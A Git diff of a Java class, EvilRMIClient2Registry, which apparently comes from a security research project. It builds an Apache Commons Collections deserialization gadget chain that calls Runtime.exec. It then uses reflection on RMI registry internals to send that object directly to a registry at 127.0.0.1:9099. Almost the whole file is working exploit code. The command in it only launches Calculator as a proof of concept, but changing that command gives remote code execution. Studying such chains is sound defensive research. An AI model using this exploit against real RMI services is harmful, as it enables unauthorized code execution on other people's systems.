@@ -1,25 +1,27 @@
 package org.trganda.client;
 
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Proxy;
-import java.rmi.NotBoundException;
-import java.rmi.RemoteException;
-import java.rmi.registry.LocateRegistry;
-import java.rmi.registry.Registry;
-import java.util.HashMap;
-import java.util.Map;
-
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import org.trganda.remote.RemoteService;
-import org.trganda.util.Exploitable;
+import sun.rmi.transport.StreamRemoteCall;
 
-public class EvilRMIClient {
+import java.io.ObjectOutput;
+import java.lang.reflect.*;
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.Operation;
+import java.rmi.server.RemoteCall;
+import java.rmi.server.RemoteObject;
+import java.rmi.server.RemoteRef;
+import java.util.HashMap;
+import java.util.Map;
+
+public class EvilRMIClient2Registry {
 
     public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
         ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
@@ -29,7 +31,7 @@ public class EvilRMIClient {
                 new InvokerTransformer("invoke",
                         new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                 new InvokerTransformer("exec",
-                        new Class[]{String.class}, new Object[]{"calc"})
+                        new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app"})
         });
 
         LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
@@ -50,16 +52,34 @@ public class EvilRMIClient {
         return anotherHandler;
     }
 
-    public void callRemote(String name) throws RemoteException, NotBoundException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
+    public void callRemote(String name) throws RemoteException {
         Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
-        RemoteService rs = (RemoteService) registry.lookup(name);
-        Object obj = create();
-        rs.doSome(obj);
+        try {
+            Field ref = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
+            Field operations = registry.getClass().getDeclaredField("operations");
+            Field interfaceHash = registry.getClass().getDeclaredField("interfaceHash");
+
+            ref.setAccessible(true);
+            operations.setAccessible(true);
+            interfaceHash.setAccessible(true);
+            RemoteRef refs = (RemoteRef) ref.get(registry);
+
+            Method newCall = refs.getClass().getDeclaredMethod("newCall", RemoteObject.class, Operation[].class, int.class, long.class);
+            Method invoke = refs.getClass().getDeclaredMethod("invoke", RemoteCall.class);
+
+            StreamRemoteCall call = (StreamRemoteCall)newCall.invoke(refs, registry, operations.get(registry), 2, interfaceHash.get(registry));
+            ObjectOutput out = call.getOutputStream();
+            out.writeObject(create());
+
+            invoke.invoke(refs, call);
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
     }
 
     public static void main(String[] args) {
         try {
-            EvilRMIClient rc = new EvilRMIClient();
+            EvilRMIClient2Registry rc = new EvilRMIClient2Registry();
 
             rc.callRemote("server");
         } catch (Exception ex) {
